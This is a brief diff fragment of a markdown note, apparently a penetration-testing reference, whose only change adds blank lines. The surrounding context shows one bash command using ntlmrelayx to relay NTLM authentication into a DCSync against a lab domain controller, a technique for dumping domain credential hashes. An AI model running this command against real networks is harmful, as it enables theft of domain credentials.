@@ -14,3 +14,5 @@ updated_at: '2023-04-10T20:36:02.527266+00:00'
 ```bash
 ntlmrelayx.py -t dcsync://DC01.LAB.LOCAL -smb2support
 ```
+
+
